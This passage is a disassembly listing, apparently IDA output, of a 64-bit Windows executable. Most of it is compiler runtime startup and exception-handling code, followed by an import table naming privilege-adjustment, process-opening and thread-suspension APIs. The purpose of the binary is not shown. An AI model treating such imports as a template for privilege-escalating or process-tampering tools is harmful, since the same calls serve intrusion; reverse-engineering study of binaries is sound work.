jnz     short loc_140006723
lea     rcx, stru_14000C4A0 ; Table
call    _initialize_onexit_table
test    eax, eax
jz      short loc_140006759

loc_140006723:
xor     al, al
add     rsp, 20h
pop     rbx
retn

loc_14000672B:
movdqa  xmm0, cs:xmmword_140008640
movdqu  xmmword ptr cs:Table._first, xmm0
mov     cs:Table._end, 0FFFFFFFFFFFFFFFFh
movdqu  xmmword ptr cs:stru_14000C4A0._first, xmm0
mov     cs:stru_14000C4A0._end, 0FFFFFFFFFFFFFFFFh

loc_140006759:
mov     cs:byte_14000C481, 1

loc_140006760:
mov     al, 1
add     rsp, 20h
pop     rbx
retn

loc_140006768:
mov     ecx, 5
call    RtlFailFast
db 0CCh
sub_1400066E0 endp

algn_140006773:
align 20h



sub_140006780 proc near

var_18= qword ptr -18h

; FUNCTION CHUNK AT 00000001400073C0 SIZE 00000018 BYTES

; __unwind { // __C_specific_handler
sub     rsp, 18h
mov     r8, rcx

loc_140006787:
;   __try { // __except at loc_14000680A
mov     eax, 5A4Dh
cmp     cs:140000000h, ax
jnz     short loc_140006806
movsxd  rcx, dword ptr cs:14000003Ch
lea     rdx, cs:140000000h
add     rcx, rdx
cmp     dword ptr [rcx], 4550h
jnz     short loc_140006806
mov     eax, 20Bh
cmp     [rcx+18h], ax
jnz     short loc_140006806
sub     r8, rdx
movzx   eax, word ptr [rcx+14h]
add     rax, 18h
add     rax, rcx
movzx   ecx, word ptr [rcx+6]
lea     rdx, [rcx+rcx*4]
lea     r9, [rax+rdx*8]

loc_1400067D3:
mov     [rsp+18h+var_18], rax
cmp     rax, r9
jz      short loc_140006802
mov     edx, [rax+0Ch]
cmp     r8, rdx
jb      short loc_1400067FC
mov     ecx, [rax+8]
add     ecx, edx
cmp     r8, rcx
jnb     short loc_1400067FC
cmp     dword ptr [rax+24h], 0
jge     short loc_1400067F8
xor     al, al
jmp     short loc_14000680C

loc_1400067F8:
mov     al, 1
jmp     short loc_14000680C

loc_1400067FC:
add     rax, 28h ; '('
jmp     short loc_1400067D3

loc_140006802:
xor     al, al
jmp     short loc_14000680C

loc_140006806:
xor     al, al
jmp     short loc_14000680C
;   } // starts at 140006787

loc_14000680A:
;   __except(loc_1400073C0) // owned by 140006787
xor     al, al

loc_14000680C:
add     rsp, 18h
retn
; } // starts at 140006780
sub_140006780 endp

algn_140006811:
align 20h



sub_140006820 proc near
push    rbx
sub     rsp, 20h
movzx   ebx, cl
call    sub_140006E80
test    eax, eax
jz      short loc_14000683F
test    bl, bl
jnz     short loc_14000683F
xor     eax, eax
xchg    rax, cs:qword_14000C478

loc_14000683F:
add     rsp, 20h
pop     rbx
retn
sub_140006820 endp

algn_140006845:
align 10h



sub_140006850 proc near
push    rbx
sub     rsp, 20h
cmp     cs:byte_14000C480, 0
movzx   ebx, cl
jz      short loc_140006866
test    dl, dl
jnz     short loc_140006873

loc_140006866:
call    sub_1400069C0
movzx   ecx, bl
call    sub_1400069C0

loc_140006873:
mov     al, 1
add     rsp, 20h
pop     rbx
retn
sub_140006850 endp

algn_14000687B:
align 20h



; __int64 __fastcall sub_140006880(_onexit_t Function)
sub_140006880 proc near
push    rbx
sub     rsp, 20h
cmp     cs:Table._first, 0FFFFFFFFFFFFFFFFh
mov     rbx, rcx
jnz     short loc_14000689A
call    _crt_atexit
jmp     short loc_1400068A9

loc_14000689A:          ; Function
mov     rdx, rbx
lea     rcx, Table      ; Table
call    _register_onexit_function

loc_1400068A9:
xor     edx, edx
test    eax, eax
cmovz   rdx, rbx
neg     rdx
sbb     eax, eax
neg     eax
dec     eax
add     rsp, 20h
pop     rbx
retn
sub_140006880 endp




sub_1400068C0 proc near

var_18= qword ptr -18h
SystemTimeAsFileTime= _FILETIME ptr  8
PerformanceCount= LARGE_INTEGER ptr  10h

push    rbx
sub     rsp, 30h
mov     rax, cs:__security_cookie
mov     rbx, 2B992DDFA232h
cmp     rax, rbx
jz      short loc_1400068EC
not     rax
mov     cs:qword_14000C040, rax
add     rsp, 30h
pop     rbx
retn

loc_1400068EC:          ; lpSystemTimeAsFileTime
lea     rcx, [rsp+38h+SystemTimeAsFileTime]
mov     qword ptr [rsp+38h+SystemTimeAsFileTime.dwLowDateTime], 0
call    cs:GetSystemTimeAsFileTime
mov     rax, qword ptr [rsp+38h+SystemTimeAsFileTime.dwLowDateTime]
mov     [rsp+38h+var_18], rax
call    cs:GetCurrentThreadId
mov     eax, eax
xor     [rsp+38h+var_18], rax
call    cs:GetCurrentProcessId
mov     eax, eax
lea     rcx, [rsp+38h+PerformanceCount] ; lpPerformanceCount
xor     [rsp+38h+var_18], rax
call    cs:QueryPerformanceCounter
mov     rax, qword ptr [rsp+38h+PerformanceCount]
mov     ecx, eax
shl     rcx, 20h
xor     rcx, rax
lea     rax, [rsp+38h+var_18]
xor     rcx, [rsp+38h+var_18]
xor     rcx, rax
mov     rax, 0FFFFFFFFFFFFh
and     rcx, rax
mov     rax, 2B992DDFA233h
cmp     rcx, rbx
cmovz   rcx, rax
mov     cs:__security_cookie, rcx
not     rcx
mov     cs:qword_14000C040, rcx
add     rsp, 30h
pop     rbx
retn
sub_1400068C0 endp

algn_14000697F:
align 20h



; int __cdecl UserMathErrorFunction(struct _exception *)
UserMathErrorFunction proc near
xor     eax, eax
retn
UserMathErrorFunction endp

align 10h



sub_140006990 proc near
mov     eax, 1
retn
sub_140006990 endp

align 20h



sub_1400069A0 proc near
mov     eax, 4000h
retn
sub_1400069A0 endp

align 10h



sub_1400069B0 proc near
lea     rcx, unk_14000C4C0
jmp     cs:InitializeSListHead
sub_1400069B0 endp

align 20h



sub_1400069C0 proc near
mov     al, 1
retn
sub_1400069C0 endp

align 10h



_guard_check_icall_nop proc near
retn    0
_guard_check_icall_nop endp

align 20h



sub_1400069E0 proc near
lea     rax, unk_14000C4D0
retn
sub_1400069E0 endp

align 10h



sub_1400069F0 proc near
sub     rsp, 28h
call    sub_140001000
or      qword ptr [rax], 24h
call    sub_1400069E0
or      qword ptr [rax], 2
add     rsp, 28h
retn
sub_1400069F0 endp

algn_140006A0B:
align 10h



sub_140006A10 proc near
xor     eax, eax
cmp     cs:dword_14000C04C, eax
setz    al
retn
sub_140006A10 endp

align 20h



sub_140006A20 proc near
lea     rax, unk_14000C578
retn
sub_140006A20 endp

align 10h



sub_140006A30 proc near
lea     rax, unk_14000C570
retn
sub_140006A30 endp

align 20h
; [00000004 BYTES: COLLAPSED FUNCTION RtlFailFast]
retn
align 10h
; [00000005 BYTES: COLLAPSED FUNCTION j_UserMathErrorFunction]
align 20h



sub_140006A60 proc near
sub     rsp, 28h
xor     ecx, ecx        ; lpModuleName
call    cs:GetModuleHandleW
test    rax, rax
jz      short loc_140006AAE
mov     ecx, 5A4Dh
cmp     [rax], cx
jnz     short loc_140006AAE
movsxd  rcx, dword ptr [rax+3Ch]
cmp     dword ptr [rcx+rax], 4550h
jnz     short loc_140006AAE
mov     edx, 20Bh
cmp     [rcx+rax+18h], dx
jnz     short loc_140006AAE
cmp     dword ptr [rcx+rax+84h], 0Eh
jbe     short loc_140006AAE
cmp     dword ptr [rcx+rax+0F8h], 0
setnz   al
add     rsp, 28h
retn

loc_140006AAE:
xor     al, al
add     rsp, 28h
retn
sub_140006A60 endp

algn_140006AB5:
align 20h



sub_140006AC0 proc near
lea     rcx, sub_140006AD0
jmp     cs:SetUnhandledExceptionFilter
sub_140006AC0 endp

align 10h



sub_140006AD0 proc near

arg_0= qword ptr  8

mov     [rsp+arg_0], rbx
push    rdi
sub     rsp, 20h
mov     rbx, [rcx]
mov     rdi, rcx
cmp     dword ptr [rbx], 0E06D7363h
jnz     short loc_140006B04
cmp     dword ptr [rbx+18h], 4
jnz     short loc_140006B04
mov     edx, [rbx+20h]
lea     eax, [rdx-19930520h]
cmp     eax, 2
jbe     short loc_140006B11
cmp     edx, 1994000h
jz      short loc_140006B11

loc_140006B04:
mov     rbx, [rsp+28h+arg_0]
xor     eax, eax
add     rsp, 20h
pop     rdi
retn

loc_140006B11:
call    __current_exception
mov     [rax], rbx
mov     rbx, [rdi+8]
call    __current_exception_context
mov     [rax], rbx
call    terminate
db 0CCh
sub_140006AD0 endp

algn_140006B2B:
align 10h



sub_140006B30 proc near

arg_0= qword ptr  8

mov     [rsp+arg_0], rbx
push    rdi
sub     rsp, 20h
lea     rbx, unk_14000A060
lea     rdi, unk_14000A060
cmp     rbx, rdi
jnb     short loc_140006B67
nop     dword ptr [rax]

loc_140006B50:
mov     rax, [rbx]
test    rax, rax
jz      short loc_140006B5E
call    cs:__guard_dispatch_icall_fptr

loc_140006B5E:
add     rbx, 8
cmp     rbx, rdi
jb      short loc_140006B50

loc_140006B67:
mov     rbx, [rsp+28h+arg_0]
add     rsp, 20h
pop     rdi
retn
sub_140006B30 endp

algn_140006B72:
align 20h



; int __cdecl Function()
Function proc near

arg_0= qword ptr  8

mov     [rsp+arg_0], rbx
push    rdi
sub     rsp, 20h
lea     rbx, unk_14000A070
lea     rdi, unk_14000A070
cmp     rbx, rdi
jnb     short loc_140006BB7
nop     dword ptr [rax]

loc_140006BA0:
mov     rax, [rbx]
test    rax, rax
jz      short loc_140006BAE
call    cs:__guard_dispatch_icall_fptr

loc_140006BAE:
add     rbx, 8
cmp     rbx, rdi
jb      short loc_140006BA0

loc_140006BB7:
mov     rbx, [rsp+28h+arg_0]
add     rsp, 20h
pop     rdi
retn
Function endp

algn_140006BC2:
align 10h



sub_140006BD0 proc near

arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h

push    rsi
push    rdi
push    r14
sub     rsp, 10h
xor     ecx, ecx

loc_140006BDB:
mov     [rsp+28h+arg_8], rbx
xor     eax, eax
cpuid
xor     ecx, 6C65746Eh
xor     edx, 49656E69h
or      edx, ecx
xor     ebx, 756E6547h
mov     r11d, eax
or      edx, ebx
mov     eax, 1
mov     ecx, 0
cpuid
mov     edi, ecx
jnz     short loc_140006C6B
and     eax, 0FFF3FF0h
mov     cs:qword_14000C058, 8000h
mov     cs:qword_14000C060, 0FFFFFFFFFFFFFFFFh
cmp     eax, 106C0h
jz      short loc_140006C57
cmp     eax, 20660h
jz      short loc_140006C57
cmp     eax, 20670h
jz      short loc_140006C57
add     eax, 0FFFCF9B0h
cmp     eax, 20h ; ' '
ja      short loc_140006C6B
mov     rcx, 100010001h
bt      rcx, rax
jnb     short loc_140006C6B

loc_140006C57:
mov     r8d, cs:dword_14000C4DC
or      r8d, 1
mov     cs:dword_14000C4DC, r8d
jmp     short loc_140006C72

loc_140006C6B:
mov     r8d, cs:dword_14000C4DC

loc_140006C72:
xor     r10d, r10d
mov     [rsp+28h+arg_10], rbp
xor     r14d, r14d
xor     esi, esi
cmp     r11d, 7
jl      short loc_140006CDD
xor     ecx, ecx
mov     eax, 7
cpuid
mov     ebp, edx
mov     r9d, ebx
bt      ebx, 9
jnb     short loc_140006CA4
or      r8d, 2
mov     cs:dword_14000C4DC, r8d

loc_140006CA4:
cmp     eax, 1
jl      short loc_140006CB8
mov     eax, 7
mov     ecx, 1
cpuid
mov     r10d, edx

loc_140006CB8:
cmp     r11d, 24h ; '$'
jl      short loc_140006CCA
mov     eax, 24h ; '$'
xor     ecx, ecx
cpuid
mov     r14d, ebx

loc_140006CCA:
cmp     r11d, 29h ; ')'
jl      short loc_140006CE2
mov     eax, 29h ; ')'
xor     ecx, ecx
cpuid
mov     esi, ebx
jmp     short loc_140006CE2

loc_140006CDD:
xor     r9d, r9d
xor     ebp, ebp

loc_140006CE2:
mov     rax, cs:qword_14000C068
mov     rbx, [rsp+28h+arg_8]
and     rax, 0FFFFFFFFFFFFFFFEh
mov     cs:dword_14000C050, 1
mov     cs:dword_14000C054, 2
mov     cs:qword_14000C068, rax
bt      edi, 14h
jnb     short loc_140006D32

loc_140006D13:
and     rax, 0FFFFFFFFFFFFFFEFh
mov     cs:dword_14000C050, 2
mov     cs:qword_14000C068, rax
mov     cs:dword_14000C054, 6

loc_140006D32:
bt      edi, 1Bh
jnb     loc_140006E68
xor     ecx, ecx
xgetbv
shl     rdx, 20h
or      rdx, rax
mov     [rsp+28h+arg_0], rdx
bt      edi, 1Ch
jnb     loc_140006E44
mov     rax, [rsp+28h+arg_0]
and     al, 6
cmp     al, 6
jnz     loc_140006E44
mov     eax, cs:dword_14000C054
or      eax, 8
mov     cs:dword_14000C050, 3
mov     cs:dword_14000C054, eax
test    r9b, 20h
jz      short loc_140006DEA
or      eax, 20h
mov     cs:dword_14000C050, 5
mov     cs:dword_14000C054, eax
and     r9d, 0D0030000h
mov     rax, cs:qword_14000C068
and     rax, 0FFFFFFFFFFFFFFFDh
mov     cs:qword_14000C068, rax
cmp     r9d, 0D0030000h
jnz     short loc_140006DF1
mov     rax, [rsp+28h+arg_0]
and     al, 0E0h
cmp     al, 0E0h
jnz     short loc_140006DEA
mov     rax, cs:qword_14000C068
or      cs:dword_14000C054, 40h
and     rax, 0FFFFFFFFFFFFFFDBh
mov     cs:dword_14000C050, 6
mov     cs:qword_14000C068, rax
jmp     short loc_140006DF1

loc_140006DEA:
mov     rax, cs:qword_14000C068

loc_140006DF1:
bt      ebp, 17h
jnb     short loc_140006E03
btr     rax, 18h
mov     cs:qword_14000C068, rax

loc_140006E03:
bt      r10d, 13h
jnb     short loc_140006E44
mov     rax, [rsp+28h+arg_0]
and     al, 0E0h
cmp     al, 0E0h
jnz     short loc_140006E44
mov     rcx, cs:qword_14000C068
and     rcx, 0FFFFFFFFFEFFFFD0h
movzx   eax, r14b
mov     cs:dword_14000C4E0, eax
mov     cs:qword_14000C068, rcx
cmp     eax, 1
jbe     short loc_140006E44
and     rcx, 0FFFFFFFFFFFFFFBFh
mov     cs:qword_14000C068, rcx

loc_140006E44:
bt      r10d, 15h
jnb     short loc_140006E68
test    sil, 1
jz      short loc_140006E68
mov     rax, [rsp+28h+arg_0]
bt      rax, 13h
jnb     short loc_140006E68
and     cs:qword_14000C068, 0FFFFFFFFFFFFFF7Fh

loc_140006E68:
mov     rbp, [rsp+28h+arg_10]
xor     eax, eax
add     rsp, 10h
pop     r14
pop     rdi
pop     rsi
retn
sub_140006BD0 endp

algn_140006E78:
align 20h



sub_140006E80 proc near
xor     eax, eax
cmp     cs:dword_14000C070, eax
setnz   al
retn
sub_140006E80 endp

align 10h
; [00000006 BYTES: COLLAPSED FUNCTION __CxxFrameHandler4]
; START OF FUNCTION CHUNK FOR sub_140005D50
;   ADDITIONAL PARENT FUNCTION sub_1400051B0
;   ADDITIONAL PARENT FUNCTION sub_140005B80

loc_140006E96:
jmp     cs:__std_terminate
; END OF FUNCTION CHUNK FOR sub_140005D50
; [00000006 BYTES: COLLAPSED FUNCTION __C_specific_handler]
; [00000006 BYTES: COLLAPSED FUNCTION _CxxThrowException]
; [00000006 BYTES: COLLAPSED FUNCTION __current_exception]
; [00000006 BYTES: COLLAPSED FUNCTION __current_exception_context]
; [00000006 BYTES: COLLAPSED FUNCTION _callnewh]
; [00000006 BYTES: COLLAPSED FUNCTION malloc]
; [00000006 BYTES: COLLAPSED FUNCTION free]
; [00000006 BYTES: COLLAPSED FUNCTION _seh_filter_exe]
; [00000006 BYTES: COLLAPSED FUNCTION _set_app_type]
; [00000006 BYTES: COLLAPSED FUNCTION __setusermatherr]
; [00000006 BYTES: COLLAPSED FUNCTION _configure_narrow_argv]
; [00000006 BYTES: COLLAPSED FUNCTION _initialize_narrow_environment]
; [00000006 BYTES: COLLAPSED FUNCTION _get_initial_narrow_environment]
; [00000006 BYTES: COLLAPSED FUNCTION _initterm]
; [00000006 BYTES: COLLAPSED FUNCTION _initterm_e]
; [00000006 BYTES: COLLAPSED FUNCTION exit]
; [00000006 BYTES: COLLAPSED FUNCTION _exit]
; [00000006 BYTES: COLLAPSED FUNCTION _set_fmode]
; [00000006 BYTES: COLLAPSED FUNCTION __p___argc]
; [00000006 BYTES: COLLAPSED FUNCTION __p___argv]
; [00000006 BYTES: COLLAPSED FUNCTION _cexit]
; [00000006 BYTES: COLLAPSED FUNCTION _c_exit]
; [00000006 BYTES: COLLAPSED FUNCTION _register_thread_local_exe_atexit_callback]
; [00000006 BYTES: COLLAPSED FUNCTION _configthreadlocale]
; [00000006 BYTES: COLLAPSED FUNCTION _set_new_mode]
; [00000006 BYTES: COLLAPSED FUNCTION __p__commode]
; [00000006 BYTES: COLLAPSED FUNCTION _initialize_onexit_table]
; [00000006 BYTES: COLLAPSED FUNCTION _register_onexit_function]
; [00000006 BYTES: COLLAPSED FUNCTION _crt_atexit]
; [00000006 BYTES: COLLAPSED FUNCTION terminate]
; [0000001D BYTES: COLLAPSED FUNCTION __GSHandlerCheck]
algn_140006F6D:
align 10h



sub_140006F70 proc near

arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h

mov     [rsp+arg_8], rbx
mov     [rsp+arg_10], rbp
push    rsi
sub     rsp, 20h
movsxd  rbp, dword ptr [r8]
mov     rsi, rcx
test    bpl, 4
jz      short loc_140006FA0
mov     eax, [r8+8]
movsxd  rbx, dword ptr [r8+4]
neg     eax
movsxd  r8, eax
add     rbx, rcx
and     rbx, r8
jmp     short loc_140006FA3

loc_140006FA0:
mov     rbx, rsi

loc_140006FA3:
mov     rax, [rdx+10h]
mov     rdx, [rdx+8]
mov     [rsp+28h+arg_0], rdi
mov     ecx, [rax+8]
add     rdx, rcx
movzx   r8d, byte ptr [rdx]
movzx   ecx, byte ptr [rdx+3]
movzx   eax, r8b
and     al, 7
cmp     al, 3
jnb     short loc_140006FD5
test    cl, 0Fh
jz      short loc_140006FDF
mov     r9d, ecx
jmp     loc_1400070E1

loc_140006FD5:
mov     edi, ecx
mov     r11d, ecx
and     edi, 1Fh
jnz     short loc_140006FE7

loc_140006FDF:
xor     r9d, r9d
jmp     loc_1400070E5

loc_140006FE7:
add     rdx, 4
mov     eax, edi
test    r8b, 40h
jz      short loc_140006FFC
lea     rdx, [rdx+rdi*2]
inc     rdx
jmp     short loc_140006FFF

loc_140006FFC:
add     rdx, rax

loc_140006FFF:
xor     r9d, r9d
shr     r11d, 5
mov     ecx, r9d
test    r11d, r11d
jz      short loc_140007043
xchg    ax, ax

loc_140007010:
movzx   r10d, byte ptr [rdx]
add     rdx, 3
mov     eax, r10d
shr     eax, 3
test    eax, eax
jz      short loc_14000703C
mov     r8d, eax
test    r10b, 2
jz      short loc_140007035
lea     rdx, [rdx+rax*2]
add     rdx, 4
jmp     short loc_14000703C

loc_140007035:
add     rdx, 3
add     rdx, r8

loc_14000703C:
inc     ecx
cmp     ecx, r11d
jb      short loc_140007010

loc_140007043:
mov     r10d, r9d
test    edi, edi
jz      loc_1400070E5
lea     r11, cs:140000000h

loc_140007055:
movzx   ecx, byte ptr [rdx]
cmp     cl, 3
jbe     short loc_14000708F
movzx   r8d, cl
and     r8b, 0Fh
lea     eax, [r8-8]
cmp     al, 2
jbe     short loc_14000708B
movzx   r8d, cl
and     r8b, 7
lea     eax, [r8-4]
cmp     al, 3
jbe     short loc_14000708B
and     cl, 3Fh         ; StackCookie
cmp     cl, 20h ; ' '
jnz     def_1400070AF   ; jumptable 00000001400070AF default case, cases 11-31
jmp     short loc_140007098

loc_14000708B:
movzx   ecx, r8b

loc_14000708F:
test    cl, cl
jz      short loc_1400070DC
cmp     cl, 20h         ; switch 33 cases
ja      short def_1400070AF ; jumptable 00000001400070AF default case, cases 11-31

loc_140007098:
movzx   eax, cl
movzx   eax, ds:(byte_140007128 - 140000000h)[r11+rax]
mov     ecx, ds:(jpt_1400070AF - 140000000h)[r11+rax*4]
add     rcx, r11
jmp     rcx             ; switch jump

loc_1400070B1:          ; jumptable 00000001400070AF cases 4,7,8
mov     eax, 1
jmp     short loc_1400070CB

loc_1400070B8:          ; jumptable 00000001400070AF cases 0,3,32
mov     eax, 2
jmp     short loc_1400070CB

loc_1400070BF:          ; jumptable 00000001400070AF cases 2,6,10
mov     eax, 3
jmp     short loc_1400070CB

loc_1400070C6:          ; jumptable 00000001400070AF cases 1,5,9
mov     eax, 5

loc_1400070CB:
add     rdx, rax
inc     r10d
cmp     r10d, edi
jb      loc_140007055
jmp     short loc_1400070E5

loc_1400070DC:
movzx   r9d, byte ptr [rdx+1]

loc_1400070E1:
and     r9, 0FFFFFFFFFFFFFFF0h

loc_1400070E5:
lea     rcx, [r9+rsi]
mov     rax, rbp
and     rax, 0FFFFFFFFFFFFFFF8h
xor     rcx, [rax+rbx]  ; StackCookie
mov     rdi, [rsp+28h+arg_0]
mov     rbx, [rsp+28h+arg_8]
mov     rbp, [rsp+28h+arg_10]
add     rsp, 20h
pop     rsi
jmp     __security_check_cookie

def_1400070AF:          ; jumptable 00000001400070AF default case, cases 11-31
call    __report_gsfailure
align 4
jpt_1400070AF dd offset loc_1400070B8 - 140000000h ; jump table for switch statement
dd offset loc_1400070C6 - 140000000h
dd offset loc_1400070BF - 140000000h
dd offset loc_1400070B1 - 140000000h
dd offset def_1400070AF - 140000000h
byte_140007128 db      0,     1,     2,     0 ; indirect table for switch statement
db      3,     1,     2,     3
db      3,     1,     2,     4
db      4,     4,     4,     4
db      4,     4,     4,     4
db      4,     4,     4,     4
db      4,     4,     4,     4
db      4,     4,     4,     4
db      0
sub_140006F70 endp

algn_140007149:
align 10h



sub_140007150 proc near
push    rbx
push    rbp
push    rsi
push    rdi
push    r14
sub     rsp, 20h
mov     rbx, [r9+38h]
mov     rsi, rdx
mov     r14, r8
mov     rbp, rcx
mov     rdx, r9
mov     rcx, rsi
mov     rdi, r9
lea     r8, [rbx+4]
call    sub_140006F70
test    byte ptr [rbp+4], 66h
mov     eax, 0
setnz   al
inc     eax
test    [rbx+4], eax
jz      short loc_1400071A8
mov     r9, rdi
mov     r8, r14
mov     rdx, rsi
mov     rcx, rbp
add     rsp, 20h
pop     r14
pop     rdi
pop     rsi
pop     rbp
pop     rbx
jmp     __CxxFrameHandler4

loc_1400071A8:
mov     eax, 1
add     rsp, 20h
pop     r14
pop     rdi
pop     rsi
pop     rbp
pop     rbx
retn
sub_140007150 endp

; [00000006 BYTES: COLLAPSED FUNCTION memcpy]
; [00000006 BYTES: COLLAPSED FUNCTION memmove]
; [00000006 BYTES: COLLAPSED FUNCTION memset]
; [00000006 BYTES: COLLAPSED FUNCTION strlen]
; [00000006 BYTES: COLLAPSED FUNCTION wcslen]
db 10h dup(0CCh)
align 10h



_guard_dispatch_icall_nop proc near
jmp     rax
_guard_dispatch_icall_nop endp

byte_1400071F2 db 14h dup(0CCh)
align 10h



_guard_xfg_dispatch_icall_nop proc near
jmp     cs:__guard_dispatch_icall_fptr
_guard_xfg_dispatch_icall_nop endp

algn_140007216:
align 20h



sub_140007220 proc near
push    rbp
sub     rsp, 20h
mov     rbp, rdx
mov     eax, [rbp+20h]
and     eax, 1
test    eax, eax
jz      short loc_14000724B
and     dword ptr [rbp+20h], 0FFFFFFFEh
lea     rcx, [rbp+90h]
add     rcx, 98h
call    cs:??1?$basic_ios@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::ios::~ios<char,std::char_traits<char>>(void)

loc_14000724B:
add     rsp, 20h
pop     rbp
retn
sub_140007220 endp




sub_140007251 proc near
lea     rcx, [rdx+90h]
add     rcx, 20h ; ' '
jmp     cs:??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::iostream::~basic_iostream<char,std::char_traits<char>>(void)
sub_140007251 endp

lea     rcx, [rdx+90h]
jmp     sub_140001B50



sub_14000726F proc near
push    rbp
sub     rsp, 20h
mov     rbp, rdx
mov     eax, [rbp+20h]
and     eax, 4
test    eax, eax
jz      short loc_14000728F
and     dword ptr [rbp+20h], 0FFFFFFFBh
lea     rcx, [rbp+70h]
call    sub_1400053E0

loc_14000728F:
add     rsp, 20h
pop     rbp
retn
sub_14000726F endp




sub_140007295 proc near
lea     rcx, [rdx+70h]
jmp     sub_1400053E0
sub_140007295 endp

align 10h
lea     rcx, [rdx+20h]
jmp     sub_1400053E0
align 20h
lea     rcx, [rdx+20h]
jmp     sub_1400053E0
lea     rcx, [rdx+20h]
jmp     sub_1400053E0
lea     rcx, [rdx+20h]
jmp     sub_1400053E0
align 10h
lea     rcx, [rdx+88h]
jmp     sub_1400053E0
lea     rcx, [rdx+48h]
jmp     sub_1400053E0
lea     rcx, [rdx+68h]
jmp     sub_1400053E0
align 20h
lea     rcx, [rdx+50h]
jmp     sub_1400053E0
align 10h
lea     rcx, [rdx+40h]
jmp     sub_1400053E0
align 20h
lea     rcx, [rdx+20h]
jmp     sub_140005F20
lea     rcx, [rdx+20h]
jmp     sub_140005D50
; START OF FUNCTION CHUNK FOR sub_140005B80
;   ADDITIONAL PARENT FUNCTION sub_1400051B0

loc_140007358:
;   catch(...) // owned by 1400052A6
;   catch(...) // owned by 140005C68
;   catch(...) // owned by 140005CCE
mov     [rsp+58h+var_48], rdx
push    rbp
sub     rsp, 20h
mov     rbp, rdx
mov     rdx, [rbp+60h]
mov     rax, [rdx]
movsxd  rcx, dword ptr [rax+4]
add     rcx, rdx
mov     r8b, 1
mov     edx, 4
call    cs:?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::ios::setstate(int,bool)
nop
mov     rax, 0
add     rsp, 20h
pop     rbp
retn
db 0CCh
; END OF FUNCTION CHUNK FOR sub_140005B80
algn_140007393:
align 20h
; START OF FUNCTION CHUNK FOR sub_140006460

loc_1400073A0:
;   __except filter // owned by 140006489
;   __except filter // owned by 1400065C5
push    rbp
sub     rsp, 20h
mov     rbp, rdx
mov     rdx, rcx        ; ExceptionPtr
mov     rcx, [rcx]
mov     ecx, [rcx]      ; ExceptionNum
call    _seh_filter_exe
nop
add     rsp, 20h
pop     rbp
retn
db 0CCh
; END OF FUNCTION CHUNK FOR sub_140006460
algn_1400073BE:
align 20h
; START OF FUNCTION CHUNK FOR sub_140006780

loc_1400073C0:
;   __except filter // owned by 140006787
push    rbp
mov     rbp, rdx
mov     rax, [rcx]
xor     ecx, ecx
cmp     dword ptr [rax], 0C0000005h
setz    cl
mov     eax, ecx
pop     rbp
retn
db 0CCh
; END OF FUNCTION CHUNK FOR sub_140006780
algn_1400073D8:
align 40h
dq 180h dup(?)
_text ends

; Section 2. (virtual address 00008000)
; Virtual size                  : 00003EDA (  16090.)
; Section size in file          : 00004000 (  16384.)
; Offset to raw data for section: 00006800
; Flags 40000040: Data Readable
; Alignment     : default
;
; Imports from ADVAPI32.dll
;

; Segment type: Externs
; _idata
; BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength)
extrn AdjustTokenPrivileges:qword
; BOOL (__stdcall *LookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid)
extrn LookupPrivilegeValueW:qword
; BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
extrn OpenProcessToken:qword

;
; Imports from KERNEL32.dll
;
; int (__stdcall *lstrlenW)(LPCWSTR lpString)
extrn lstrlenW:qword
; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
extrn WriteFile:qword
; LPWSTR (__stdcall *lstrcpynW)(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength)
extrn lstrcpynW:qword
; LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
extrn VirtualAlloc:qword
; BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode)
extrn TerminateProcess:qword
; DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize)
extrn GetModuleFileNameW:qword
; BOOL (__stdcall *Thread32Next)(HANDLE hSnapshot, LPTHREADENTRY32 lpte)
extrn Thread32Next:qword
; void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection)
extrn LeaveCriticalSection:qword
; void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection)
extrn InitializeCriticalSection:qword
; DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
extrn SetFilePointer:qword
; DWORD (__stdcall *GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer)
extrn GetTempPathW:qword
; HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName)
extrn CreateMutexW:qword
; BOOL (__stdcall *Thread32First)(HANDLE hSnapshot, LPTHREADENTRY32 lpte)
extrn Thread32First:qword
; DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds)
extrn WaitForSingleObject:qword
; HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
extrn CreateFileW:qword
; DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName)
extrn GetFileAttributesW:qword
; DWORD (__stdcall *SuspendThread)(HANDLE hThread)
extrn SuspendThread:qword
; HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName)
extrn GetModuleHandleA:qword
; HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
extrn OpenProcess:qword
